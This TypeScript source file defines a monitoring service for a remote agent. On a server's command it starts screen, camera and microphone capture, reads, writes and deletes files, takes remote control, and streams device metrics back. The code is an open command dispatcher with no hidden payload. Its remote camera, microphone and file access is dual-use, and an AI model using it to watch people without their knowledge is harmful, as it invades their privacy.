import { EventEmitter } from 'events';
import { DeviceManager } from '../core/DeviceManager';
import { ConnectionManager } from '../core/ConnectionManager';
import { ScreenCaptureService } from './ScreenCaptureService';
import { CameraService } from './CameraService';
import { MicrophoneService } from './MicrophoneService';
import { FileSystemService } from './FileSystemService';
import { RemoteControlService } from './RemoteControlService';
import { Logger } from '../utils/Logger';

export class MonitoringService extends EventEmitter {
  private logger: Logger;
  private deviceManager: DeviceManager;
  private connectionManager: ConnectionManager;
  private screenCaptureService: ScreenCaptureService;
  private cameraService: CameraService;
  private microphoneService: MicrophoneService;
  private fileSystemService: FileSystemService;
  private remoteControlService: RemoteControlService;
  private metricsInterval: NodeJS.Timeout | null = null;
  private isRunning: boolean = false;

  constructor(deviceManager: DeviceManager, connectionManager: ConnectionManager) {
    super();
    this.logger = new Logger('MonitoringService');
    this.deviceManager = deviceManager;
    this.connectionManager = connectionManager;

    // Initialize services
    this.screenCaptureService = new ScreenCaptureService(connectionManager);
    this.cameraService = new CameraService(connectionManager);
    this.microphoneService = new MicrophoneService(connectionManager);
    this.fileSystemService = new FileSystemService(connectionManager);
    this.remoteControlService = new RemoteControlService(connectionManager);

    this.setupEventHandlers();
  }

  private setupEventHandlers(): void {
    // Handle connection events
    this.connectionManager.on('connected', () => {
      this.onConnected();
    });

    this.connectionManager.on('disconnected', () => {
      this.onDisconnected();
    });

    this.connectionManager.on('authenticated', () => {
      this.onAuthenticated();
    });

    // Handle command messages
    this.connectionManager.on('command', (data: any) => {
      this.handleCommand(data);
    });

    // Handle remote control events
    this.connectionManager.on('remote_control_start', (data: any) => {
      this.remoteControlService.start(data);
    });

    this.connectionManager.on('remote_control_stop', (data: any) => {
      this.remoteControlService.stop();
    });

    // Handle WebRTC events
    this.connectionManager.on('webrtc_offer', (data: any) => {
      this.screenCaptureService.handleWebRTCOffer(data);
    });

    this.connectionManager.on('webrtc_ice_candidate', (data: any) => {
      this.screenCaptureService.handleWebRTCIceCandidate(data);
    });
  }

  async start(): Promise<void> {
    if (this.isRunning) {
      this.logger.warn('MonitoringService already running');
      return;
    }

    try {
      this.logger.info('Starting MonitoringService...');
      this.isRunning = true;

      // Start services
      await this.screenCaptureService.initialize();
      await this.cameraService.initialize();
      await this.microphoneService.initialize();
      await this.fileSystemService.initialize();
      await this.remoteControlService.initialize();

      this.logger.info('MonitoringService started successfully');
    } catch (error) {
      this.logger.error('Failed to start MonitoringService:', error);
      this.isRunning = false;
      throw error;
    }
  }

  async stop(): Promise<void> {
    if (!this.isRunning) {
      return;
    }

    try {
      this.logger.info('Stopping MonitoringService...');
      this.isRunning = false;

      // Stop metrics collection
      this.stopMetricsCollection();

      // Stop all services
      await this.screenCaptureService.stop();
      await this.cameraService.stop();
      await this.microphoneService.stop();
      await this.remoteControlService.stop();

      this.logger.info('MonitoringService stopped successfully');
    } catch (error) {
      this.logger.error('Failed to stop MonitoringService:', error);
    }
  }

  private async onConnected(): Promise<void> {
    this.logger.info('Connected to server');
  }

  private async onDisconnected(): Promise<void> {
    this.logger.info('Disconnected from server');
    this.stopMetricsCollection();
  }

  private async onAuthenticated(): Promise<void> {
    this.logger.info('Authenticated successfully');

    // Send initial device info
    await this.sendDeviceInfo();

    // Start metrics collection
    this.startMetricsCollection();
  }

  private async sendDeviceInfo(): Promise<void> {
    try {
      const deviceInfo = await this.deviceManager.updateDeviceInfo();

      await this.connectionManager.sendMessage({
        type: 'device_info',
        data: deviceInfo,
      });

      this.logger.info('Device info sent');
    } catch (error) {
      this.logger.error('Failed to send device info:', error);
    }
  }

  private startMetricsCollection(): void {
    if (this.metricsInterval) {
      return;
    }

    // Send metrics every 10 seconds
    this.metricsInterval = setInterval(async () => {
      try {
        const metrics = await this.deviceManager.getSystemMetrics();

        await this.connectionManager.sendMessage({
          type: 'system_metrics',
          data: metrics,
        });
      } catch (error) {
        this.logger.error('Failed to send metrics:', error);
      }
    }, 10000);

    this.logger.info('Metrics collection started');
  }

  private stopMetricsCollection(): void {
    if (this.metricsInterval) {
      clearInterval(this.metricsInterval);
      this.metricsInterval = null;
      this.logger.info('Metrics collection stopped');
    }
  }

  private async handleCommand(data: any): Promise<void> {
    const { command, params } = data;

    this.logger.info('Received command:', command);

    try {
      let result: any;

      switch (command) {
        case 'get_device_info':
          result = await this.deviceManager.updateDeviceInfo();
          break;

        case 'get_system_metrics':
          result = await this.deviceManager.getSystemMetrics();
          break;

        case 'start_screen_capture':
          result = await this.screenCaptureService.startCapture(params);
          break;

        case 'stop_screen_capture':
          result = await this.screenCaptureService.stopCapture();
          break;

        case 'start_camera':
          result = await this.cameraService.startCamera(params);
          break;

        case 'stop_camera':
          result = await this.cameraService.stopCamera();
          break;

        case 'start_microphone':
          result = await this.microphoneService.startRecording(params);
          break;

        case 'stop_microphone':
          result = await this.microphoneService.stopRecording();
          break;

        case 'list_files':
          result = await this.fileSystemService.listFiles(params.path);
          break;

        case 'read_file':
          result = await this.fileSystemService.readFile(params.path);
          break;

        case 'write_file':
          result = await this.fileSystemService.writeFile(params.path, params.content);
          break;

        case 'delete_file':
          result = await this.fileSystemService.deleteFile(params.path);
          break;

        case 'start_remote_control':
          result = await this.remoteControlService.start(params);
          break;

        case 'stop_remote_control':
          result = await this.remoteControlService.stop();
          break;

        default:
          throw new Error(`Unknown command: ${command}`);
      }

      // Send command result
      await this.connectionManager.sendMessage({
        type: 'command_result',
        data: {
          command,
          success: true,
          result,
        },
      });
    } catch (error) {
      this.logger.error('Command execution failed:', error);

      // Send error result
      await this.connectionManager.sendMessage({
        type: 'command_result',
        data: {
          command,
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        },
      });
    }
  }
}
